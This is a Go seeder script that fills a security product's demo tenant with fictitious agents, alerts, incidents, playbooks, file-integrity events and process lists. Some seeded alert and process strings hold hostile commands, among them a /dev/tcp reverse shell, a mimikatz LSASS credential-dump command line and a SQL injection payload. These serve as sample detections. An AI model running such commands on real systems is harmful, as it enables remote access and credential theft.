// Demo data seeder — run once against the demo environment to pre-populate
// the XCloak Security Suite demo tenant (id=9999) with realistic data.
//
// Usage:
//
//	cd xcloak-ngfw/backend && go run ./cmd/seed/demo
package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/joho/godotenv"
	_ "github.com/lib/pq"
)

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func mustExec(db *sql.DB, query string, args ...any) {
	if _, err := db.Exec(query, args...); err != nil {
		log.Fatalf("seed error:\n%s\nargs: %v\nerr: %v", query, args, err)
	}
}

func main() {
	godotenv.Load()

	dsn := fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=disable",
		env("DB_HOST", "localhost"),
		env("DB_PORT", "5432"),
		env("DB_USER", "xcloak"),
		env("DB_PASSWORD", "xcloak"),
		env("DB_NAME", "xcloak"),
	)
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		log.Fatalf("cannot reach database: %v", err)
	}

	log.Println("Seeding demo tenant…")
	seedTenant(db)
	log.Println("Seeding demo agents…")
	agentIDs := seedAgents(db)
	log.Println("Seeding demo alerts…")
	seedAlerts(db, agentIDs)
	log.Println("Seeding demo incidents…")
	incidentIDs := seedIncidents(db, agentIDs)
	log.Println("Seeding demo playbooks…")
	seedPlaybooks(db, agentIDs, incidentIDs)
	log.Println("Seeding FIM alerts…")
	seedFIM(db, agentIDs)
	log.Println("Seeding compliance scores…")
	seedCompliance(db)
	log.Println("Seeding endpoint processes…")
	seedProcesses(db, agentIDs)
	log.Println("Demo seed complete.")
}

func seedTenant(db *sql.DB) {
	mustExec(db, `
		INSERT INTO tenants (id, name, slug, is_active)
		VALUES (9999, 'Demo Corp Security', 'demo-corp', true)
		ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, is_active = true
	`)
	mustExec(db, `SELECT setval('tenants_id_seq', (SELECT GREATEST(last_value, 10000) FROM tenants_id_seq))`)
}

func seedAgents(db *sql.DB) []int {
	agents := []struct {
		hostname  string
		os        string
		ip        string
		status    string
		machineID string
	}{
		{"web-prod-01", "linux", "10.0.1.10", "online", "demo-machine-001"},
		{"db-server-02", "linux", "10.0.1.20", "online", "demo-machine-002"},
		{"win-workstation-05", "windows", "10.0.2.55", "online", "demo-machine-003"},
		{"android-mobile-01", "android", "192.168.1.88", "online", "demo-machine-004"},
	}

	var ids []int
	for _, a := range agents {
		var id int
		err := db.QueryRow(`
			INSERT INTO agents (hostname, os, ip_address, status, last_seen, machine_id, token, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			ON CONFLICT (machine_id) DO UPDATE
				SET status=EXCLUDED.status, last_seen=EXCLUDED.last_seen, tenant_id=9999
			RETURNING id`,
			a.hostname, a.os, a.ip, a.status,
			time.Now().Add(-2*time.Minute), a.machineID, "demo-tok-"+a.machineID,
		).Scan(&id)
		if err != nil {
			log.Printf("agent %s: %v", a.hostname, err)
			continue
		}
		ids = append(ids, id)
		mustExec(db, `
			INSERT INTO agent_health (agent_id, health_score, health_status, last_heartbeat)
			VALUES ($1,$2,'healthy',$3)
			ON CONFLICT (agent_id) DO UPDATE
				SET health_score=EXCLUDED.health_score, last_heartbeat=EXCLUDED.last_heartbeat`,
			id, 75+len(ids)*5, time.Now().Add(-2*time.Minute),
		)
	}
	return ids
}

func seedAlerts(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type alert struct {
		agentIdx  int
		severity  string
		rule      string
		message   string
		tactic    string
		technique string
		mitreName string
		status    string
		minsAgo   int
	}
	alerts := []alert{
		{0, "critical", "C2 Beacon Detected", "Outbound beacon to 185.220.101.47:443 every 60s — matches Cobalt Strike jitter profile", "Command and Control", "T1071.001", "Application Layer Protocol: Web Protocols", "open", 5},
		{0, "high", "Port Scan Detected", "TCP SYN sweep from 10.0.1.10 across 10.0.0.0/24 — 254 hosts in 2 seconds", "Discovery", "T1046", "Network Service Discovery", "open", 12},
		{1, "critical", "SQL Injection Attempt", "Payload in POST /api/users: 1' OR '1'='1 — blocked by WAF rule #442", "Initial Access", "T1190", "Exploit Public-Facing Application", "open", 18},
		{2, "high", "Credential Dump — LSASS", "mimikatz.exe accessed lsass.exe (pid 584) — NTLM hashes extracted", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "open", 23},
		{1, "high", "Suspicious Data Exfiltration", "15 MB transferred to 94.102.49.190 via HTTPS — possible exfil", "Exfiltration", "T1048", "Exfiltration Over Alternative Protocol", "investigating", 31},
		{0, "medium", "FIM: /etc/passwd Modified", "/etc/passwd changed — new entry for user svc_backdoor detected", "Persistence", "T1136.001", "Create Account: Local Account", "open", 45},
		{2, "medium", "PowerShell Encoded Command", "Base64 -EncodedCommand detected — execution bypass technique", "Execution", "T1059.001", "Command and Scripting Interpreter: PowerShell", "open", 67},
		{0, "high", "SSH Brute Force", "42 failed auth attempts from 45.33.32.156 in 60 seconds", "Credential Access", "T1110.001", "Brute Force: Password Guessing", "resolved", 90},
		{1, "medium", "Suspicious Cron Job", "New crontab: */5 * * * * /tmp/.hidden/beacon — persistence indicator", "Persistence", "T1053.003", "Scheduled Task/Job: Cron", "open", 102},
		{3, "low", "USB Debugging Enabled", "Android device USB debugging active — elevated attack surface", "Defense Evasion", "T1562", "Impair Defenses", "open", 110},
		{2, "critical", "Ransomware File Pattern", "Mass .encrypted rename — 847 files in 30s on /var/data", "Impact", "T1486", "Data Encrypted for Impact", "investigating", 125},
		{0, "medium", "DNS Tunneling Detected", "Long TXT queries to evil-domain.xyz — matches iodine profile", "Command and Control", "T1071.004", "Application Layer Protocol: DNS", "open", 140},
		{1, "low", "Weak TLS Negotiated", "TLSv1.0 with 203.0.113.42 — deprecated protocol", "Defense Evasion", "T1573", "Encrypted Channel", "open", 155},
		{0, "high", "SUID Binary Modified", "SUID set on /usr/local/bin/custom_helper — priv-esc risk", "Privilege Escalation", "T1548.001", "Abuse Elevation Control: Setuid/Setgid", "open", 168},
		{2, "medium", "Scheduled Task: Persistence", "Task WindowsUpdate_Helper runs cmd.exe at logon", "Persistence", "T1053.005", "Scheduled Task/Job: Scheduled Task", "resolved", 200},
		{1, "low", "Event Log Cleared", "Security log cleared (Event ID 1102) by SYSTEM", "Defense Evasion", "T1070.001", "Indicator Removal: Clear Windows Event Logs", "open", 220},
		{0, "medium", "Reverse Shell Detected", "bash -i >& /dev/tcp/192.168.1.99/4444 executed", "Execution", "T1059.004", "Unix Shell Interpreter", "investigating", 240},
		{3, "low", "Rooting Tool Found", "Magisk socket at /dev/.magisk — device may be rooted", "Defense Evasion", "T1562", "Impair Defenses", "open", 260},
		{1, "high", "Unsigned Kernel Module", "rootkit_helper.ko loaded — system integrity risk", "Persistence", "T1547.006", "Kernel Modules and Extensions", "open", 280},
		{0, "medium", "Impossible Travel Login", "Login from Nigeria — no history of this location for user admin", "Initial Access", "T1078", "Valid Accounts", "resolved", 300},
		{2, "low", "Windows Defender Disabled", "Real-time protection disabled via registry key", "Defense Evasion", "T1562.001", "Disable or Modify Tools", "open", 320},
		{0, "high", "JA3 Fingerprint Match", "JA3=769,47-53-5-10-49171:0-65281:23 matches Metasploit payload", "Command and Control", "T1071", "Application Layer Protocol", "open", 340},
		{1, "medium", "Macro Execution Detected", "cmd.exe spawned by winword.exe — Office macro execution", "Execution", "T1204.002", "User Execution: Malicious File", "open", 360},
		{3, "low", "Unknown App Installed", "com.hacker.spyware installed from unknown source", "Initial Access", "T1476", "Deliver Malicious App", "open", 380},
		{2, "medium", "Pass-the-Hash Attempt", "NTLM hash reuse from 10.0.2.55 to dc-01 — lateral movement", "Lateral Movement", "T1550.002", "Pass the Hash", "investigating", 400},
	}

	for i, a := range alerts {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		fingerprint := fmt.Sprintf("demo-%s-%d", a.technique, i)
		mustExec(db, `
			INSERT INTO alerts
				(agent_id, severity, rule_name, log_message, created_at,
				 mitre_tactic, mitre_technique, mitre_name, status, fingerprint, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,9999)`,
			agentID, a.severity, a.rule, a.message,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
			a.tactic, a.technique, a.mitreName, a.status, fingerprint,
		)
	}
}

func seedIncidents(db *sql.DB, agentIDs []int) []int {
	if len(agentIDs) == 0 {
		return nil
	}
	now := time.Now()
	incidents := []struct {
		agentIdx    int
		title       string
		severity    string
		status      string
		description string
		aiSummary   string
		minsAgo     int
	}{
		{
			0, "Active C2 Beaconing — Suspected Cobalt Strike Implant", "critical", "investigating",
			"Host web-prod-01 generating HTTPS callbacks to 185.220.101.47 every 60s. eBPF telemetry shows beacon process as renamed sshd binary. FIM confirms /usr/sbin/sshd was replaced 4h ago.",
			"High-confidence C2 implant. Recommend immediate isolation of web-prod-01, memory acquisition, and threat hunt across all hosts. Block 185.220.101.47 at firewall immediately.",
			25,
		},
		{
			2, "Credential Dump + Lateral Movement Chain", "high", "investigating",
			"win-workstation-05 ran mimikatz against LSASS, extracted NTLM hashes, then attempted Pass-the-Hash to dc-01 within 8 minutes. AD logs show 3 successful logins with stolen credential.",
			"Multi-stage attack in progress. Disable affected accounts, force Kerberos ticket invalidation, isolate win-workstation-05 for forensic analysis.",
			120,
		},
		{
			1, "Ransomware Contained — 847 Files Encrypted", "critical", "resolved",
			"db-server-02 detected mass .encrypted rename at 847 files/30s. SOAR playbook isolated host and created DFIR snapshot within 90s. Confirmed BlackCat/ALPHV variant.",
			"Contained. Host isolated in 90s. Restoring from clean backup (2026-07-07 02:00 UTC). Patch CVE-2024-1234 on all Linux hosts to close initial access vector.",
			480,
		},
	}

	var ids []int
	for _, inc := range incidents {
		agentID := agentIDs[inc.agentIdx%len(agentIDs)]
		var id int
		err := db.QueryRow(`
			INSERT INTO incidents
				(agent_id, title, severity, status, description, ai_summary, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			RETURNING id`,
			agentID, inc.title, inc.severity, inc.status, inc.description, inc.aiSummary,
			now.Add(-time.Duration(inc.minsAgo)*time.Minute),
		).Scan(&id)
		if err != nil {
			log.Printf("incident: %v", err)
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

func seedPlaybooks(db *sql.DB, agentIDs []int, incidentIDs []int) {
	playbooks := []struct {
		name        string
		triggerType string
		actionType  string
	}{
		{"Auto-Isolate on Ransomware Detection", "alert", "isolate_agent"},
		{"Notify SOC on Critical C2 Beacon", "alert", "notify_slack"},
		{"Block IP on Brute Force Threshold", "alert", "block_ip"},
		{"Create DFIR Case on Incident Escalation", "incident", "create_case"},
	}
	var pbIDs []int
	for _, p := range playbooks {
		var id int
		err := db.QueryRow(`
			INSERT INTO playbooks (name, trigger_type, action_type, enabled, tenant_id)
			VALUES ($1,$2,$3,true,9999)
			RETURNING id`,
			p.name, p.triggerType, p.actionType,
		).Scan(&id)
		if err != nil {
			log.Printf("playbook: %v", err)
			continue
		}
		pbIDs = append(pbIDs, id)
	}

	// Seed pending approval executions so SOAR queue has visible items
	if len(pbIDs) > 0 && len(agentIDs) > 0 {
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'isolate_agent','pending_approval',$3,9999)`,
			pbIDs[0], agentIDs[0], time.Now().Add(-10*time.Minute),
		)
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'block_ip','pending_approval',$3,9999)`,
			pbIDs[2], agentIDs[1], time.Now().Add(-5*time.Minute),
		)
	}
}

func seedFIM(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type change struct {
		agentIdx   int
		path       string
		changeType string
		oldHash    string
		newHash    string
		minsAgo    int
	}
	changes := []change{
		{0, "/etc/passwd", "modified", "a1b2c3d4e5f6", "f6e5d4c3b2a1", 45},
		{0, "/usr/sbin/sshd", "modified", "deadbeef1234", "cafebabe5678", 240},
		{0, "/etc/crontab", "modified", "11223344aabb", "aabb11223344", 102},
		{1, "/etc/sudoers", "modified", "99887766ffee", "ffeeff998877", 180},
		{1, "/var/spool/cron/root", "created", "", "123abc456def", 102},
		{2, "C:\\Windows\\System32\\cmd.exe", "modified", "abcdef123456", "654321fedcba", 320},
		{2, "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.bat", "created", "", "aabbccdd1122", 200},
	}
	for _, ch := range changes {
		agentID := agentIDs[ch.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO fim_alerts
				(agent_id, file_path, change_type, old_hash, new_hash, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,9999)`,
			agentID, ch.path, ch.changeType, ch.oldHash, ch.newHash,
			now.Add(-time.Duration(ch.minsAgo)*time.Minute),
		)
	}
}

func seedCompliance(db *sql.DB) {
	// compliance_scores requires a parent compliance_reports row
	var reportID int
	err := db.QueryRow(`
		INSERT INTO compliance_reports
			(title, report_type, generated_by, summary, created_at, tenant_id)
		VALUES ('Demo Environment Baseline','automated','demo-seeder','{}',now(),9999)
		RETURNING id`,
	).Scan(&reportID)
	if err != nil {
		log.Printf("compliance_reports: %v", err)
		return
	}

	frameworks := []struct {
		framework string
		score     int
		passed    int
		failed    int
	}{
		{"CIS", 72, 144, 56},
		{"NIST_CSF", 68, 68, 32},
		{"PCI_DSS", 81, 97, 23},
	}
	for _, f := range frameworks {
		mustExec(db, `
			INSERT INTO compliance_scores
				(report_id, framework, score, passed, failed, computed_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,now(),9999)`,
			reportID, f.framework, f.score, f.passed, f.failed,
		)
	}
}

func seedProcesses(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type proc struct {
		agentIdx int
		pid      int
		name     string
		cmdline  string
		user     string
		cpu      string
		mem      string
	}
	procs := []proc{
		{0, 1, "systemd", "/sbin/init", "root", "0.1", "0.3"},
		{0, 1234, "nginx", "nginx: master process /usr/sbin/nginx", "www-data", "0.3", "1.2"},
		{0, 5820, "sshd", "/usr/sbin/sshd -D", "root", "99.2", "0.2"},
		{0, 6001, "python3", "python3 /tmp/.hidden/c2client.py", "root", "1.2", "0.6"},
		{1, 1, "systemd", "/sbin/init", "root", "0.1", "0.3"},
		{1, 3310, "mysqld", "/usr/sbin/mysqld --daemonize", "mysql", "4.5", "18.2"},
		{1, 4521, "bash", "bash /tmp/.hidden/beacon", "www-data", "0.8", "0.1"},
		{2, 4, "System", "", "SYSTEM", "0.2", "0.1"},
		{2, 584, "lsass.exe", "C:\\Windows\\System32\\lsass.exe", "SYSTEM", "0.5", "0.8"},
		{2, 8832, "mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "Administrator", "45.3", "0.3"},
		{2, 9100, "powershell.exe", "powershell.exe -EncodedCommand SQBFAFgA...", "User", "2.1", "1.2"},
	}
	for _, p := range procs {
		agentID := agentIDs[p.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_processes
				(agent_id, pid, process_name, cmdline, username, cpu_percent, mem_percent, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)`,
			agentID, p.pid, p.name, p.cmdline, p.user, p.cpu, p.mem, now,
		)
	}
}
